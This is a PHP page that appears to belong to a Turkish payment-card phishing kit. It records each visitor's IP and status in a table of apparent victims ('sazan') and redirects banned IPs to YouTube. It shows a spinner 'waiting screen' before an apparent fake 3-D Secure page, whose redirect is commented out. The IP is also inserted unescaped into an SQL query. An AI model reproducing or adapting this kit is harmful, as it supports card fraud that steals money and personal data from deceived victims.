<?php
  date_default_timezone_set('Europe/Istanbul');
   include(__DIR__ . "/Core/getRealIPAdress.php");
   include(__DIR__ . "/Core/mobileDetect.php");
   include(__DIR__ . "/Core/browserDetect.php");
   include(__DIR__ . "/Connection.php");

   ob_start(); 
   session_start(); 

   
   $ip = getUserIP();

   $db->query("UPDATE sazan SET now = 'Bekletme Ekranında' WHERE ip = '{$ip}'");

   
   $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
   foreach($ban as $kontrol){
       if($kontrol['ban'] == $ip){ 
           header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
       } 
   }
   
  // $person_waiting_time_sorgulama = $db->query("SELECT person_waiting_time FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
   
   $person_waiting_time_sorgulama = $db->query("SELECT person_waiting_time FROM site WHERE id = '1'");
$person_waiting_time_sorgulandi = $person_waiting_time_sorgulama->fetchColumn();
   
   
   $odemebeklet = $person_waiting_time_sorgulandi;
   
  // echo $odemebeklet;
  
  //Updated Discord/.yusufo ; GeceMavisi - Yusuf;
   
  // header( "refresh:".$odemebeklet.";url=3D_Security.php" );
   
   ?>
<!DOCTYPE html>
<html lang="en">
</head>
<style>

.loadersmall {
  border: 5px solid #f3f3f3;
  -webkit-animation: spin 1s linear infinite;
  animation: spin 1s linear infinite;
  border-top: 5px solid #555;
  border-radius: 50%;
  width: 50px;
  height: 50px;
  
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

</style>






</head>


<body>


<div class="loadersmall" style="display: block; margin: auto;margin-top:20%;"></div>

  

	
	
	</body>
	</html>
	
   